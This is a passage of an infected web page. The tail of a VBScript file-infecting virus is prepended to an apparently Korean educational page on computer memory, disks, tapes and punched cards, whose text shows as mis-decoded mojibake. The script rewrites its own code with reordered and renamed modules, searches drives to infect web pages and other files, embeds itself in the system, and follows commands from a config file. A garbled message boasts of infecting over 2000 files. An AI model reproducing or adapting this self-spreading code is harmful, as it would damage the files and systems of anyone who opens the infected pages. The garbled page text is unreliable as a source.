            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case Else
            If PreInstance = True Then
                WScript.Quit
            End If
            If IsOK(objfso, Date(), FullPath_Config) = False Then
                If objfso.FileExists(FullPath_Config) = True Then
                    Order = Trim(ReadOK(objfso, FullPath_Config))
                    Order_Order = Trim(Mid(Order, 1, InStr(1, Order, "@") -1))
                    Order_Para = Trim(Mid(Order, InStr(1, Order, "@") + 1, Len(Order) - InStr(1, Order, "@")))
                End If

                Select Case Order_Order
                Case "InfectFiles"
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_WebPage = Head_V & Version & VBCRLF & WebHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_WebPage = ChangeModelOrder(VbsCode_WebPage, Sum_ModelCode)
                    VbsCode_WebPage = ChangeName(VbsCode_WebPage, Names)
                    VbsCode_Victim = Head_V & Version & VBCRLF & VictimHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Victim = ChangeModelOrder(VbsCode_Victim, Sum_ModelCode)
                    VbsCode_Victim = ChangeName(VbsCode_Victim, Names)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 0)
                    Order_Para = Order_Para + Cnt
                    If Order_Para>2000 Then
                        Call WriteOK(objfso, FullPath_Config, "Msg", "ÄúÒÑÓĞ³¬¹ı2000¸öÎÄ¼ş±»¸ĞÈ¾!²»¹ıÇë·ÅĞÄ£¬´Ë²¡¶¾ºÜÈİÒ×±»Çå³ı!ÇëÁªÏµ418465***-_- !")
                    Else
                        Call WriteOK(objfso, FullPath_Config, "InfectFiles", Order_Para)
                    End If
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

                Case "Msg"
                    MsgBox Order_Para
                    Call WriteOK(objfso, FullPath_Config, "", "")
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

                Case "UnLoadMe"
                    Call RestoreSystem(objfso)
                    Wscript.Quit

                Case "KillVirus"
                    Call RestoreSystem(objfso)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 1)
                    Wscript.Quit

                Case Else
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_WebPage = Head_V & Version & VBCRLF & WebHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_WebPage = ChangeModelOrder(VbsCode_WebPage, Sum_ModelCode)
                    VbsCode_WebPage = ChangeName(VbsCode_WebPage, Names)
                    VbsCode_Victim = Head_V & Version & VBCRLF & VictimHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Victim = ChangeModelOrder(VbsCode_Victim, Sum_ModelCode)
                    VbsCode_Victim = ChangeName(VbsCode_Victim, Names)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 0)
                    Call WriteOK(objfso, FullPath_Config, "InfectFiles", Cnt)
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

            End Select
        Else
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            MainBody = GetMainBody(vbsCode, Sum_ModelCode)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V 'Éú³É²¡¶¾ÌåÍêÕû´úÂë
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode) '¸Ä±äÄ£¿é×éºÏË³Ğò
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names) '¸Ä±äÄ£¿é±êÖ¾Ãû³Æ
            Call MonitorSystem(objfso, VbsCode_Virus)
        End If
    End Select
    Set objfso = Nothing
    Set objshell = Nothing
End Sub

'JTBLRJSOPBL1_3

'ÀÎÆÄ¾Ë
</SCRIPT>
<html>

<head>
<meta http-equiv="content-type" content="text/html; charset=euc-kr">
<title>3. ±â¾ïÀåÄ¡</title>
<meta name="generator" content="Namo WebEditor v5.0">
</head>

<body bgcolor="white" text="black" link="blue" vlink="purple" alink="red" topmargin="0" marginheight="0">
<script language="JavaScript">
<!--
document.body.style.scrollbarBaseColor='#FFFFFF'
document.body.style.scrollbarArrowColor='#FFFFFF'
document.body.style.scrollbarDarkShadowColor='#FFFFFF'
document.body.style.scrollbarFaceColor='#FFFFFF'
document.body.style.scrollbarHighlightColor='#FFFFFF'
document.body.style.scrollbarShadowColor='#C0C0C0'
document.body.style.scrollbar3dlightColor='#FFFFFF'

-->
</script>
<TABLE cellSpacing=0 cellPadding=0 width=800>
<TBODY>
<TR>
<TD width=837 height=679>
<TABLE cellSpacing=0 cellPadding=0 width=707 align=center>
<TBODY>
<TR>
<TD width=707>
<TABLE cellSpacing=5 width=708 bgColor="#FCF9F0" border=8>
<TBODY>
<TR>
<TD width=678 height=266>
<TABLE cellSpacing=0 cellPadding=0 width=549 align=center>
<TBODY>
<TR>
<TD width=549>
<DL>
<DIV align=left>
<DT>&nbsp; 
<DT><SMALL><B><FONT color=maroon>3.&nbsp;±â¾ïÀåÄ¡</FONT></B></SMALL> 
<DT>&nbsp; 
<DT><SMALL id=ln3>ÄÄÇ»ÅÍÀÇ ±â¾ïÀåÄ¡·Î ÃÖÃÊ¿¡ µîÀåÇÑ °ÍÀº ÃÊÀ½ÆÄ¿Í ¼öÀºÅÊÅ©¿¡ ÀÇÇÑ Áö¿¬È¸·Î(<FONT 
title="òÀ : ´õµô Áö">òÀ</FONT><FONT title="æÅ : ²ø ¿¬">æÅ</FONT><FONT 
title="üŞ : µ¹¾Æ¿Ã(È¸)">üŞ</FONT><FONT title="ÖØ : ±æ ·Î">ÖØ</FONT>)ÀÌ¸ç, ÀÌº¸´Ù ¾à°£ ´Ê°Ô <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=80344&amp;sec=1">ºê¶ó¿î°ü</A>¿¡ 
ÀÇÇÑ Á¤Àü(<FONT title="ğ¡ : °í¿äÇÒ Á¤">ğ¡</FONT><FONT 
title="ï³ : ¹ø°³ Àü">ï³</FONT>)±â¾ïÀåÄ¡¿Í 
ÀÚ±âµå·³ÀÌ Á¦1¼¼´ë¿Í Á¦2¼¼´ë ÃÊ±â¿¡ °ÉÃÄ ÁÖ±â¾ïÀåÄ¡·Î ÀÌ¿ëµÇ¾ú°í, ±â¾ï¼ÒÀÚ¿¡ °¢Çü(<FONT 
title="ÊÇ : »Ô,ÃÑ°¢,°ßÁÙ,¸ğ³¯,">ÊÇ</FONT><FONT title="û¡ : Çü»ó Çü">û¡</FONT>) ÀÚ±âÀÌ·ÂÇö»ó(<FONT 
title="í¸ : ÀÚ¼® ÀÚ">í¸</FONT><FONT title="Ñ¨ : ±â¿î ±â">Ñ¨</FONT><FONT 
title="×Û : ½Å ¸®">×Û</FONT><FONT title="Õö : Áö³¾ ·Â">Õö</FONT><FONT 
title="úŞ : ³ªÅ¸³¯ Çö">úŞ</FONT><FONT title="ßÚ : ÄÚ³¢¸® »ó">ßÚ</FONT>)À» °¡Áø µµ³Ó ¸ğ¾çÀÇ 
Æä¶óÀÌÆ®ÄÚ¾î(ferrite core:<FONT 
title="í¸ : ÀÚ¼® ÀÚ">í¸</FONT><FONT 
title="ãı : ¸¶À½ ½É">ãı</FONT>)¸¦ ÀÚÈ­ÇÏ¿© 1<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=82016&amp;sec=1">ºñÆ®</A>(bit:2Áø¼öÀÇ 
1ÀÚ¸®)ÀÇ Á¤º¸¸¦ ±â¾ïÇÏ´Â ÄÚ¾î¸¦ ¼ö¸¸~¼ö¹é¸¸ °³ ¸ğ¾Æ¼­ ±â¾ïÀåÄ¡·Î ÇÑ ÀÚ½É±â¾ïÀåÄ¡´Â <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=70382&amp;sec=1">¹İµµÃ¼</A> 
±â¾ïÀåÄ¡°¡ ÃâÇöÇÏ±â±îÁö ÁÖ±â¾ïÀåÄ¡ÀÇ ´ë´Ù¼ö¸¦ Â÷ÁöÇÏ¿´´Ù. ¶ÇÇÑ ÀÌ ½Ã±â¿¡ ¿¬±¸µÈ ÀÚ¼ºÃ¼ÀÇ ¾ãÀº ½ºÆıÀ» À¯¸®±âÆÇ¿¡ <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=143381&amp;sec=1">Áø°øÁõÂø</A>(<FONT 
title="òØ : Âü Áø">òØ</FONT><FONT title="Íö : ºô °ø">Íö</FONT><FONT 
title="ñú : Âñ Áõ">ñú</FONT><FONT title="ó· : ºÙÀ» Âø">ó·</FONT>)½ÃÅ² ÀÚ±â¹Ú¸·±â¾ïÀåÄ¡(<FONT 
title="í¸ : ÀÚ¼® ÀÚ">í¸</FONT><FONT title="Ñ¨ : ±â¿î ±â">Ñ¨</FONT><FONT 
title="Úİ : ¿¯À» ¹Ú">Úİ</FONT><FONT title="Ø¯ : Èê¶¼±â.¸· ¸·">Ø¯</FONT><FONT 
title="ÑÀ : ±â·ÏÇÒ ±â">ÑÀ</FONT><FONT title="åã : »ı°¢ÇÒ ¾ï">åã</FONT><FONT 
title="íû : ²Ù¹Ğ Àå">íû</FONT><FONT title="öÇ : µÑ.º£Ç® Ä¡">öÇ</FONT>)¿Í ±× º¯ÇüÀº ´õ °í¼ÓµµÀÇ 
±â¾ïÀåÄ¡ÀÌ´Ù.</SMALL> 
<DT><SMALL id=ln3>°¡Àå ³Î¸® »ç¿ëµÇ°í ÀÖ´Â <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=70382&amp;sec=1">¹İµµÃ¼</A> 
±â¾ïÀåÄ¡´Â 1960³â ¸»°æºÎÅÍ ½Ç¿ëµÇ±â ½ÃÀÛÇÏ¿© °í¹ĞµµÁıÀûÈ¸·Î(LSI) ±â¼úÀÇ ¹ß´Ş·Î 1970³â´ë¿¡ µé¾î¿Í¼­ º»°İÀûÀÎ ½Ç¿ëÀÌ Á¤ÂøµÇ¾ú´Ù. <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=70382&amp;sec=1">¹İµµÃ¼</A> 
ÁıÀûÈ¸·Î¿¡ ÀÇÇÑ ÀåÄ¡±â¼úÀº ½Ö±Ø¼ºÇü(bipolar <FONT title="û¡ : Çü»ó Çü">û¡</FONT>)°ú MOS(metal oxide 
semiconductor)ÇüÀ¸·Î ³ª´©¾îÁö´Âµ¥, ½Ö±Ø¼ºÇüÀº MOSÇü¿¡ ºñÇÏ¿© ÀÏ¹İÀûÀ¸·Î ¼ÒºñÀü·ÂÀÌ ¸¹°í °í¼Óµ¿ÀÛ¿¡ ÀûÇÕÇÏ³ª, MOSÇüÀº ½Ö±Ø¼ºÇü¿¡ 
ºñÇÏ¿© ÁıÀûµµ¸¦ ¿Ã¸± ¼ö ÀÖÁö¸¸ ÀıÈ¯½Ã°£(switching time)ÀÌ ¶³¾îÁú ¼ö ÀÖ´Ù. ÃÖ±ÙÀÇ ¸ğµç ÄÄÇ»ÅÍ¿¡´Â MOSÇüÀ» »ç¿ëÇÏ°í ÀÖ´Ù. 
MOSÇü Áß¿¡¼­ P-MOS´Â Á¦Á¶°¡ ½¬¿ì¸ç, N-MOS´Â µ¿ÀÛ¼Óµµ°¡ ºü¸£°í, C-MOS´Â ¼ÒºñÀü·ÂÀÌ ÀûÀº °ÍÀÌ Æ¯Â¡ÀÌ´Ù.</SMALL> 
<DT><SMALL id=ln3>ÀÚ±âµå·³ ÀåÄ¡´Â ÀÚ¼º¸é±â¾ï(<FONT 
title="í¸ : ÀÚ¼® ÀÚ">í¸</FONT><FONT 
title="àõ : ¼ºÇ° ¼º">àõ</FONT><FONT title="Øü : ³¸ ¸é">Øü</FONT><FONT 
title="ÑÀ : ±â·ÏÇÒ ±â">ÑÀ</FONT><FONT title="åã : »ı°¢ÇÒ ¾ï">åã</FONT>) Áß¿¡¼­´Â µµ´Ş½Ã°£ÀÌ °¡Àå Âª°í ±â±¸°¡ 
´Ü¼øÇÏ¿© ½Å·Úµµ°¡ ³ô±â ¶§¹®¿¡ °³¹ß ÃÊ±â¿¡´Â ÁÖ±â¾ïÀåÄ¡·Î »ç¿ëµÇ¾úÀ¸³ª, ÇöÀç¿¡´Â TSS(time sharing system:<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=100514&amp;sec=1">½ÃºĞÇÒ½Ã½ºÅÛ</A>) 
&middot;Åë½Å°è &middot;ÁÂ¼®¿¹¾à ½Ã½ºÅÛ µî Áï½Ã¼ºÀ» ¿ä±¸ÇÏ´Â °í¼ÓÁÖº¯ÀåÄ¡·Î¼­ ¼ö¹é¸¸¾î ÀÌ»óÀÇ ´ë¿ë·®ÀÇ °ÍÀÌ ÀÌ¿ëµÇ°í ÀÖ´Ù. ÀÌ°ÍÀº ¿øÅë ¸ğ¾çÀÇ È¸ÀüÃ¼ Ç¥¸é¿¡ 
<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=5606&amp;sec=1">°­ÀÚ¼ºÃ¼</A>(<FONT 
title="Ë­ : ±»¼¿ °­">Ë­</FONT><FONT 
title="í¸ : ÀÚ¼® ÀÚ">í¸</FONT><FONT 
title="àõ : ¼ºÇ° ¼º">àõ</FONT><FONT title="ô÷ : ¸ö Ã¼">ô÷</FONT>)ÀÇ ¾ãÀº ÇÇ¸·À» ÀÔÈù °ÍÀ¸·Î, ±× ¿ø±âµÕÀ» 
µû¶ó ÀÚ±â±â·Ï¿ë Çìµå(head)¸¦ ¹è¿­ÇÑ °ÍÀÌ´Ù. ÀÚ±âµğ½ºÅ© ±â¾ïÀåÄ¡´Â °í¼ÓÈ¸ÀüÇÏ°í ÀÖ´Â ÀÚ¼º¿øÆÇ»ó¿¡ ¹Ì¼ÒÇÑ °£°İÀ¸·Î <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=131262&amp;sec=1">ÀÚ±âÇìµå</A>¸¦ 
À¯ÁöÇÏ¿© µ¿½É¿ø»óÀÇ ´Ù¼öÀÇ Æ®·¢(track)¿¡ Á¤º¸¸¦ ±â·ÏÇÏ´Â ÀåÄ¡·Î ¹«¼øµµ´Ş(<FONT title="Ùí : ¾øÀ» ¹«">Ùí</FONT><FONT 
title="â÷ : ¼øÇÒ ¼ø">â÷</FONT><FONT title="Óğ : ÀÌ¸¦(µµ)">Óğ</FONT><FONT 
title="Ó¹ : Åë´ŞÇÒ ´Ş">Ó¹</FONT>:random access) ±â´ÉÀ» °¡Áø´Ù. ÀÚ±âµå·³¿¡ ºñÇÏ¿© µ¿ÀÏºÎÇÇ¿¡¼­ ±â·Ï¸éÀûÀÌ Å©°Ô µÇ¹Ç·Î 
¼ÒÇü &middot;°æ·®ÀÌ µÇ°í, ¶ÇÇÑ È¸ÀüÃà»ó¿¡ ÀÚ¼º¿øÆÇÀ» ¿©·¯ Àå °ãÃÄ ½×À» ¼ö ÀÖ¾î ±â¾ï¿ë·®ÀÌ Å©´Ù.</SMALL> 
<DT><SMALL id=ln3>ÀÚ±âµğ½ºÅ© ÀåÄ¡´Â °­ÀÚ¼º Àç·á¸¦ ÀÔÈù Áö¸§ 36~64 cm Á¤µµÀÇ ¿øÆÇ, ÀĞ°í ¾²´Â Çìµå, ÀÌ°ÍÀ» ¹ŞÄ¡´Â 
¾Ï(arm), ÇìµåÀÇ ÀÌµ¿°ú À§Ä¡¸¦ °áÁ¤ÇÏ´Â Æ÷Áö¼Å³Ê(positioner)·Î ±¸¼ºµÈ´Ù. Á¤º¸´Â È¸ÀüÃàÀ» Áß½ÉÀ¸·Î ÇÏ´Â µ¿½É¿øÀ» µû¶ó ±â·ÏµÇ´Âµ¥, 
ÀÌµé µ¿½É¿øÀ» Æ®·¢ÀÌ¶ó ÇÑ´Ù. <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=131262&amp;sec=1">ÀÚ±âÇìµå</A>´Â 
µµ´Ş°£(<FONT title="Óğ : ÀÌ¸¦(µµ)">Óğ</FONT><FONT 
title="Ó¹ : Åë´ŞÇÒ ´Ş">Ó¹</FONT><FONT 
title="ÊÔ : ÊÌÀÇ ¼ÓÀÚ">ÊÔ</FONT>:access arm)ÀÇ ¾Õ¿¡ ÀåÄ¡µÇ¾î ÀÖ¾î µµ´Ş°£ÀÌ ¸ÕÀú ¿òÁ÷¿© ¿øÆÇ»óÀÇ Æ®·¢À» Ã£°í, Æ®·¢»óÀÇ 
±â¾ï À§Ä¡°¡ È¸ÀüÇÏ¿© ÇìµåÀÇ ¾Æ·¡¸¦ Åë°úÇÒ ¶§±îÁö ±â´Ù·Á ÀĞ°í ¾²°Ô µÈ´Ù. ¶ÇÇÑ µğ½ºÅ©¸¦ ¸ğµÎ ±³È¯ÇÏ¿© »ç¿ëÇÒ ¼ö ÀÖ´Â 
µğ½ºÅ©ÆÑ(diskpack) ±â¾ïÀåÄ¡µµ ÀÖ´Ù. ¶Ç, µğ½ºÅ©¸¦ ÀÛÀº ½ÃÆ® ¸ğ¾çÀ¸·Î ÇÏ¿© °£´ÜÈ÷ ±³È¯ÇÒ ¼ö ÀÖµµ·Ï ÇÑ ÇÃ·ÎÇÇ µğ½ºÅ©(floppy 
disk:diskette ÀÌ¶ó°íµµ ÇÑ´Ù) ±â¾ïÀåÄ¡´Â ¼Óµµ¿Í ¿ë·®¸é¿¡¼­´Â µÚ¶³¾îÁö³ª, °¡°İÀÌ Àú·ÅÇÏ°í °£ÆíÇÏ¿© ¼Ò±Ô¸ğÀÇ ÄÄÇ»ÅÍ¿¡ ¸¹ÀÌ ÀÌ¿ëµÇ°í 
ÀÖ´Ù.</SMALL> 
<DT><SMALL id=ln3>ÀÚ±âÅ×ÀÌÇÁ ÀåÄ¡´Â ¿ÜºÎ±â¾ïÀåÄ¡·Î¼­ ³Êºñ 12.7 mm, ±æÀÌ 720~1,080 mÀÇ Æú¸®¿¡Æ¿·»ÅÚ·¹ÇÁÅ»»ê°è 
Å×ÀÌÇÁ·Î ÀÚ¼ºÀç·á¸¦ µµÆ÷ÇÏ¿© µ¥ÀÌÅÍ¸¦ ±×°÷¿¡ ±â·ÏÇÏ´Âµ¥, 7Æ®·¢(7°³ÀÇ ÆòÇàÆ®·¢)ÀÇ 8¿­/mm(200 rpi:rpi´Â rows per inch) 
&middot;22¿­/mm(556 rpi), 9Æ®·¢¿¡¼­ 32¿­/ mm(800 rpi) &middot;63¿­/mm(1,600 rpi) &middot;246¿­/mm(6,250 rpi)ÀÇ 
¹Ğµµ·Î Á¤º¸°¡ ±â·ÏµÈ´Ù. ÀĞ°í ¾²´Â ÀåÄ¡´Â Å×ÀÌÇÁ ¸®ÄÚ´õ¿Í °°Àº ¿ø¸®ÀÌ³ª, ´Ù¸¥ Á¡Àº µğÁöÅĞÁ¤º¸ÀÇ Æ÷È­ÀÚ±â±â·Ï(<FONT 
title="øé : ¹èºÎ¸¦ Æ÷">øé</FONT><FONT title="ûú : È­ÇÒ(È­)">ûú</FONT><FONT 
title="í¸ : ÀÚ¼® ÀÚ">í¸</FONT><FONT title="Ñ¨ : ±â¿î ±â">Ñ¨</FONT><FONT 
title="ÑÀ : ±â·ÏÇÒ ±â">ÑÀ</FONT><FONT title="Öâ : ±â·ÏÇÒ ·Ï">Öâ</FONT>)ÀÌ¶ó´Â °Í, Àü¼Û¼Óµµ¸¦ Çâ»ó½ÃÅ°±â À§ÇØ 
°í¼ÓÈ­, ±Ş°İÇÑ ±âµ¿ &middot;Á¤Áö¸¦ ½Å¼ÓÃ³¸®ÇÏµµ·Ï Æ¯¼öÇÑ ±â±¸¸¦ °®°í ÀÖ´Ù. ÀÚ±âÅ×ÀÌÇÁ ÀåÄ¡´Â ºñ±³Àû °ªÀÌ Àú·ÅÇÏ°í ´Ù¸¥ ¸ÅÃ¼¿¡ ºñÇÏ¿© ºÎÇÇ±â·Ï¹Ğµµ°¡ 
³ô°í ÀÚ¸®¸¦ ÀâÁö ¾Ê´Â µîÀÇ ÀÌÁ¡À¸·Î ´ë·® µ¥ÀÌÅÍÀÇ º¸Á¸ ¹× ¿î¹İ, ¼øÂ÷Ã³¸® µ¥ÀÌÅÍ¸¦ ÁÖ·Î ÇÏ´Â ¾÷¹« µî¿¡ ³Î¸® »ç¿ëµÇ°í ÀÖ´Ù.</SMALL> 
<DT><SMALL id=ln3>ÃÊ´ë¿ë·®(MSS:mass storage system) ±â¾ïÀåÄ¡´Â ±â¾ï¿ë·®ÀÌ 1011¡­1012 <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=82016&amp;sec=1">ºñÆ®</A> 
ÀÌ»ó, Æò±Õ µµ´Ş½Ã°£ÀÌ ÃÊ(<FONT title="õ© : ±î²ô¶ó±â ÃÊ">õ©</FONT>)ÀÎ ÁÖº¯±â¾ïÀåÄ¡¸¦ ¸»ÇÏ¸ç, ±â·Ï¸ÅÃ¼·Î¼­ ÀÚ±âÅ×ÀÌÇÁ Àç·á 
µîÀÇ ÀÚ±â±â·ÏÀç·á¸¦ ÀÌ¿ëÇÑ ÃÊ´ë¿ë·® ±â¾ïÀåÄ¡´Â ÀÚ±âÅ×ÀÌÇÁ &middot;ÀÚ±âµğ½ºÅ© ÀåÄ¡¸¦ º¸¿ÏÇÏ´Â ÃÊ´ë¿ë·® ±â¾ïÀåÄ¡·Î, ¶Ç ÀºÇà°ú º¸ÇèÈ¸»ç µîÀÇ 
Àú¼Ó(<FONT title="î¸ : ³·À»(Àú),¼÷ÀÏ(Àú)">î¸</FONT><FONT 
title="áÜ : ºü¸¦ ¼Ó">áÜ</FONT>) ÃÊ´ë¿ë·®ÀÇ 
¿Â¶óÀÎ ±â¾ïÀåÄ¡·Î, ¶Ç´Â ±¹°¡Àû ÇÁ·ÎÁ§Æ® µî µ¥ÀÌÅÍ º£ÀÌ½º(data base)¿¡ »ç¿ëµÈ´Ù. ÀÌ ¹Û¿¡ Æ¯¼ö±â¾ïÀåÄ¡·Î ÃÊÀüµµÃ¼ÀÇ ¹Ú¸·À¸·Î ±â¾ïÈ¸·Î¸¦ 
±¸¼ºÇÏ¿© ±ØÀú¿Â(<FONT title="Ğ¿ : Áö±ØÇÒ ±Ø">Ğ¿</FONT><FONT title="î¸ : ³·À»(Àú),¼÷ÀÏ(Àú)">î¸</FONT><FONT title="è® : µû¶æÇÒ ¿Â">è®</FONT>)ÇÏ¿¡¼­ µ¿ÀÛ½ÃÅ°´Â ÃÊÀüµµ 
±â¾ïÀåÄ¡, ±â¾ï¸ÅÃ¼¿¡ ´ëÇÏ¿© ±¤ÇĞÀû(<FONT title="ÎÃ : ºû(±¤),¿µÈ­(±¤)">ÎÃ</FONT><FONT 
title="ùÊ : ¹è¿ï ÇĞ">ùÊ</FONT><FONT 
title="îÜ : Àû½ÇÇÒ Àû">îÜ</FONT>)ÀÎ ¹æ¹ıÀ» ÀÌ¿ëÇÏ¸ç Á¤º¸¸¦ ÀĞ°í ¾²´Â 
±¤±â¾ïÀåÄ¡, <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=80344&amp;sec=1">ºê¶ó¿î°ü</A> 
±â¾ïÀ» ¹ßÀü½ÃÅ² ÀüÀÚºö ±â¾ïÀåÄ¡ µîÀÌ ÀÖ´Ù. ÀÌ»óÀÇ ±â¾ïÀåÄ¡µéÀº ¸ğµÎ ±â¾ïÀ» ÀĞ°í ¾²°í ÇÒ ¼ö ÀÖÀ¸³ª, ±â¾ïÀÇ ³»¿ëÀÌ °íÁ¤µÇ¾î ÀÖ¾î ÀĞ±â¸¸ ÇÒ 
¼ö ÀÖ°í, ¾µ ¼ö ¾ø´Â ±â¾ïÀåÄ¡ ROM(read only memory)µµ ÀÖ´Ù. »çÁø±â¼úÀ» ÀÀ¿ëÇÑ °íÁ¤±â¾ïÀº ´ë·®ÀÇ µ¥ÀÌÅÍ¸¦ ±â·ÏÇÒ ¼ö ÀÖ¾î 
ÀÚµ¿¹ø¿ªµÇ´Â »ç¼­(<FONT title="Şö : ¸» »ç">Şö</FONT><FONT title="ßö : ±Û ¼­">ßö</FONT>)¿Í °°Àº ÀÀ¿ëÀ» 
»ı°¢ÇÒ ¼ö ÀÖ´Ù. ¶ÇÇÑ ICÀÇ °íÁ¤±â¾ïÀº ÄÄÇ»ÅÍ ³í¸®È¸·ÎÀÇ ÀÏºÎ¸¦ ÇÁ·Î±×·¡¹ÖÀ¸·Î ´ë¿ë½ÃÅ´À¸·Î½á º¸´Ù Àú·ÅÇÑ ÄÄÇ»ÅÍ¸¦ ¼³°èÇÒ ¼ö 
ÀÖ´Ù.</SMALL> 
<DT>&nbsp; 
<DT><SMALL><B><FONT color=maroon>4.&nbsp;ÀÔÃâ·ÂÀåÄ¡</FONT></B></SMALL> 
<DT>&nbsp; 
<DT><SMALL id=ln3>ÄÄÇ»ÅÍ¿¡ Á¤º¸¸¦ ³Ö´Â °ÍÀ» ÀÔ·Â(input)ÀÌ¶ó ÇÏ°í, ÄÄÇ»ÅÍ·ÎºÎÅÍ Á¤º¸¸¦ ¾ò¾î ³»´Â °ÍÀ» 
Ãâ·Â(output)ÀÌ¶ó ÇÑ´Ù. ÀÔÃâ·ÂÀ» ½ÇÇàÇÏ´Â °ÍÀÌ ÀÔÃâ·ÂÀåÄ¡ÀÌ´Ù. ¿øÇ¥(<FONT title="ê« : ±Ù¿ø(¿ø)">ê«</FONT><FONT 
title="øù : Ç¥ Ç¥">øù</FONT>)¸¦ ÄÄÇ»ÅÍ¿¡ ³ÖÀ» ¼ö ÀÖ´Â µ¥ÀÌÅÍ·Î ÀÛ¼ºÇÏ´Â ¹æ¹ıÀ¸·Î Ãµ°ø(<FONT 
title="ô¾ : ¶ÕÀ» Ãµ">ô¾</FONT><FONT title="Íî : ±¸¸Û °ø">Íî</FONT>)Ä«µå¸¦ ¸¹ÀÌ ÀÌ¿ëÇÏ´Âµ¥, 
Ãµ°øÄ«µå(punched card)´Â ¿À·¡ ÀüºÎÅÍ Á¤º¸Ã³¸®ÀÇ ±â·Ï¸ÅÃ¼·Î Ãë±Ş°ú º¸°üÀÌ ¿ëÀÌÇÏ°í, ¶Ç ¼ö½Ã·Î ¼ø¼­¸¦ ¹Ù²Ù°Å³ª ÃßÃâÀÌ °¡´ÉÇÏ±â ¶§¹®¿¡ 
³Î¸® ÀÌ¿ëµÇ°í ÀÖ´Ù. </SMALL>
<DT><SMALL id=ln3>Ãµ°øÄ«µå´Â 1890³â¿¡ ¹Ì±¹ÀÇ Åë°èÇĞÀÚ H.È¦·¯¸®½º¿¡ ÀÇÇÏ¿© °í¾ÈµÇ¾ú´Âµ¥, ÃÖÃÊÀÇ ¸ñÀûÀº ¹Ì±¹ÀÇ 
±¹¼¼Á¶»ç(<FONT title="ÏĞ : ³ª¶ó(±¹)">ÏĞ</FONT><FONT title="á§ : ±â¼¼(¼¼)">á§</FONT><FONT 
title="ğà : °í¸¦ Á¶">ğà</FONT><FONT title="ŞÛ : »ç½ÇÇÒ.Á¶»çÇÒ »ç">ŞÛ</FONT>)ÀÇ Áı°è¸¦ »êÃâÇÏ´Â °ÍÀÌ¾úÀ¸¸ç, 
PCS(punch card system:È¸°è±â &middot;<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=79374&amp;sec=1">ºĞ·ù±â</A> 
&middot;<FONT title="ğÎ : ºñÃâ Á¶">ğÎ</FONT><FONT title="ùê : ÇÕÇÒ(ÇÕ)">ùê</FONT><FONT 
title="Ñ¦ : º£Æ² ±â">Ñ¦</FONT> &middot;<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=76881&amp;sec=1">º¹»ç±â</A> 
µî)¸¦ ÀÌ¿ëÇÔÀ¸·Î½á ¼º°øÀûÀ¸·Î ¼öÇàÇÏ¿´´Ù. ÀÌ·Î½á ÀÏ·ÃÀÇ Ãµ°øÄ«µå Åë°è±â°è°¡ ¿¬´Ş¾Æ »óÇ°È­µÇ¾ú´Ù. Ãµ°øÄ«µå´Â ¼¼·Î 8.26 cm, °¡·Î 18.7 
cm, µÎ²² 0.017 cmÀÇ ÁÁÀº ÁúÀÇ Ä«µå·Î 1¸Å¿¡ 80ÀÚ±îÁö Ãµ°øÇÒ ¼ö ÀÖ´Ù. Ä«µåÆÇµ¶±â ÀåÄ¡´Â <A 
